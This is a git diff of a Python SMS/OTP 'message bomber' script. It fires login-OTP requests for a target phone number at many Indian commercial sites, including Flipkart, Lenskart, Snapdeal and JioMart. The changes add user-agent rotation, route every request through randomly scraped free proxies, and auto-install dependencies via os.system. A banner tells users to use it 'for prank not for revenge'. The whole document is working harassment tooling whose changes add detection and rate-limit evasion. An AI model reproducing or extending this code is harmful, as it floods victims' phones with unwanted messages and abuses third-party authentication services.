@@ -1,14 +1,27 @@
-try: import requests
-except: print("Importing requests failed Please install requests using - pip install requests")
+import os
 import json
+import random
+try: import requests
+except: os.system('cmd /k "pip install requests"')
+
+
 
 class Bomber:
-	useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
-	acceptlanguage = "en-GB,en-US;q=0.9,en;q=0.8"
+	
+	
 
 	def __init__(self,user_mobile,number_of_messege):
 		self.user_mobile = user_mobile
 		self.number_of_messege = number_of_messege
+		self.acceptlanguage = "en-GB,en-US;q=0.9,en;q=0.8"
+
+
+	def getUserAgent(self):
+		with open('useragent.json') as f:
+			data = json.load(f)
+			user_agent_list =  data["user_agent"]
+		userAgent = random.choice(user_agent_list)
+		return userAgent
 
 
 	def _checkinternet(self):
@@ -19,6 +32,14 @@ class Bomber:
 			print("Check your internet connection and the modules")
 			return False
 
+	def getproxy(self):
+		proxy_scrape_url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
+		try:
+			proxy_request = requests.get(proxy_scrape_url, Timeout =  10)
+		except:
+			return False
+		proxylist =  proxy_request.text.split()
+		return 'https://' + random.choice(proxylist)
 	
 	def flipkart(self):
 		url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
@@ -29,18 +50,18 @@ class Bomber:
 		"Connection": "keep-alive",
 		"Content-Length": "53",
 		"Content-Type": "application/json",
-		"DNT": "1",
+		"DNT": "1",	
 		"Host": "rome.api.flipkart.com",
 		"Origin": "https://www.flipkart.com",
 		"Referer": "https://www.flipkart.com/",
 		"Sec-Fetch-Dest": "empty",
 		"Sec-Fetch-Mode": "cors",
 		"Sec-Fetch-Site": "same-site",
-		"User-Agent": self.useragent,
-		"X-user-agent": self.useragent + " FKUA/website/42/website/Desktop"
+		"User-Agent": self.getUserAgent(),
+		"X-user-agent": self.getUserAgent() + " FKUA/website/42/website/Desktop"
 		}
 		try:
-			request =  requests.post(url, data  = json.dumps( {"loginId":"+91" + self.user_mobile}) , headers = flipkart_header)
+			request =  requests.post(url, data  = json.dumps( {"loginId":"+91" + self.user_mobile}) , headers = flipkart_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if(request.status_code ==  200 ):
@@ -62,10 +83,10 @@ class Bomber:
 		"Sec-Fetch-Dest": "empty",
 		"Sec-Fetch-Mode": "cors",
 		"Sec-Fetch-Site": "same-site",
-		"User-Agent": self.useragent
+		"User-Agent": self.getUserAgent()
 		}
 		try:
-			request = requests.get(url ,headers=confirmtkt_header)
+			request = requests.get(url ,headers=confirmtkt_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if(request.status_code==200):
@@ -86,13 +107,13 @@ class Bomber:
 			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "cors",
 			"sec-fetch-site": "same-site",
-			"user-agent": self.useragent,
+			"user-agent": self.getUserAgent(),
 			"x-api-client": "desktop",
 			"x-b3-traceid": "991589389250988",
 			"x-session-token": "85d09926-3a73-4dbe-9f30-86b9f29f4a67"
 			}
 		try:
-			request = requests.post(url, data=json.dumps({"telephone":self.user_mobile}),headers = lenskat_header)
+			request = requests.post(url, data=json.dumps({"telephone":self.user_mobile}),headers = lenskat_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if(request.status_code==200):
@@ -111,11 +132,11 @@ class Bomber:
 			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "cors",
 			"sec-fetch-site": "same-origin",
-			"user-agent": self.useragent,
+			"user-agent": self.getUserAgent(),
 			"x-requested-with": "XMLHttpRequest",
 		}
 		try:
-			r = requests.post(url, data="mob="+ self.user_mobile +"&vcode=&rsend=0&name=deV", headers=justdial_header)
+			r = requests.post(url, data="mob="+ self.user_mobile +"&vcode=&rsend=0&name=deV", headers=justdial_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if(r.status_code==200):
@@ -137,11 +158,11 @@ class Bomber:
 			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "cors",
 			"sec-fetch-site": "same-origin",
-			"user-agent": self.useragent,
+			"user-agent": self.getUserAgent(),
 			"x-requested-with": "XMLHttpRequest",
 		}
 		try:
-			r = requests.post(url, data="log_mode=1&ctrl="+self.user_mobile, headers=indialends_header)
+			r = requests.post(url, data="log_mode=1&ctrl="+self.user_mobile, headers=indialends_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if(r.status_code==200):
@@ -162,11 +183,11 @@ class Bomber:
 			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "cors",
 			"sec-fetch-site": "same-origin",
-			"user-agent": self.useragent,
+			"user-agent": self.getUserAgent(),
 			"x-requested-with": "XMLHttpRequest",
 		}
 		try:
-			request = requests.post(url, data="mobile=" + self.user_mobile, headers=apolopharmacy_header)
+			request = requests.post(url, data="mobile=" + self.user_mobile, headers=apolopharmacy_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if (request.status_code == 200):
@@ -186,11 +207,11 @@ class Bomber:
 			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "cors",
 			"sec-fetch-site": "same-origin",
-			"user-agent": self.useragent,
+			"user-agent": self.getUserAgent(),
 			"x-requested-with": "XMLHttpRequest"
 		}
 		try:
-			request = requests.post(url, data="ubimobile="+ self.user_mobile, headers=magicbrike_header)
+			request = requests.post(url, data="ubimobile="+ self.user_mobile, headers=magicbrike_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if(request.status_code==200):
@@ -212,10 +233,10 @@ class Bomber:
 			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "cors",
 			"sec-fetch-site": "same-site",
-			"user-agent": self.useragent
+			"user-agent": self.getUserAgent()
 		}
 		try:
-			request = requests.post(url, data=json.dumps({"mobileNumber": self.user_mobile}), headers=ajio_header)
+			request = requests.post(url, data=json.dumps({"mobileNumber": self.user_mobile}), headers=ajio_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if (request.json()['success']):
@@ -225,8 +246,7 @@ class Bomber:
 
 	def mylescars(self):
 		url = "https://www.mylescars.com/usermanagements/chkContact"
-		ajio_header = {
-			"accept": "*/*",
+		myle_header = {
 			"accept": "application/json",
 			"accept-encoding": "gzip, deflate, br",
 			"accept-language": self.acceptlanguage,
@@ -238,11 +258,11 @@ class Bomber:
 			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "cors",
 			"sec-fetch-site": "same-origin",
-			"user-agent": self.useragent,
+			"user-agent": self.getUserAgent(),
 			"x-requested-with": "XMLHttpRequest"
 		}
 		try:
-			request = requests.post(url, data="contactNo="+ self.user_mobile, headers=ajio_header)
+			request = requests.post(url, data="contactNo="+ self.user_mobile, headers=myle_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if(request.status_code==200):
@@ -250,7 +270,7 @@ class Bomber:
 
 	def unacademy(self):
 		url = "https://unacademy.com/api/v1/user/get_app_link/"
-		ajio_header = {
+		unac_header = {
 			"accept": "application/json",
 			"accept-encoding": "gzip, deflate, br",
 			"accept-language": self.acceptlanguage,
@@ -263,10 +283,10 @@ class Bomber:
 			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "cors",
 			"sec-fetch-site": "same-origin",
-			"user-agent": self.useragent
+			"user-agent": self.getUserAgent()
 		}
 		try:
-			request = requests.post(url, data=json.dumps({"phone": self.user_mobile}), headers=ajio_header)
+			request = requests.post(url, data=json.dumps({"phone": self.user_mobile}), headers=unac_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if(request.status_code==200):
@@ -287,11 +307,11 @@ class Bomber:
 			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "cors",
 			"sec-fetch-site": "same-origin",
-			"user-agent": self.useragent,
+			"user-agent": self.getUserAgent(),
 			"X-Requested-With": "XMLHttpRequest"
 		}
 		try:
-			request = requests.post(url, data="emailId=&mobileNumber="+ self.user_mobile + "&purpose=LOGIN_WITH_MOBILE_OTP",headers=snapdeal_head)
+			request = requests.post(url, data="emailId=&mobileNumber="+ self.user_mobile + "&purpose=LOGIN_WITH_MOBILE_OTP",headers=snapdeal_head,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if (request.json()['status'] == "fail"):
@@ -308,11 +328,11 @@ class Bomber:
 			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "cors",
 			"sec-fetch-site": "same-origin",
-			"user-agent": self.useragent,
+			"user-agent": self.getUserAgent(),
 			"referer": "https://www.jiomart.com/customer/account/login"
 		}
 		try:
-			request = requests.get(url, headers = jiomart_header)
+			request = requests.get(url, headers = jiomart_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if(request.status_code==400):
@@ -372,7 +392,7 @@ class Bomber:
 
 
 print("                                             ")
-print("   Messge Bomber Script Made by      D 3 V   ")
+print("   Messge Bomber Script Made by    # D 3 V   ")
 print("                                             ")
 print("Use this for prank not for revenge-----------")
 print( "        https://github.com/Devn913          ")
